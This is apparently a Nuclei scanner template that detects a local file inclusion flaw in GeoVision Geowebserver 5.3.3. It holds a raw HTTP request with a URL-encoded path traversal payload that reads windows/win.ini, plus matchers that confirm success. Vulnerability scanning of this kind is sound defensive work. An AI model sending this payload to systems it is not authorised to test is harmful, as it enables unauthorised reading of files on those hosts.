id: geowebserver-lfi2
info:
  author: madrobot
  name: GeoVision Geowebserver 5.3.3 - LFI
  reference: https://www.exploit-db.com/exploits/50211
  severity: high
  tags: geowebserver,lfi
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - bit app support
    - fonts
    - extensions
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /Visitor/bin/WebStrings.srf?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&obj_name=aaa
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept-Encoding: gzip, deflate

    Accept: */*

    '
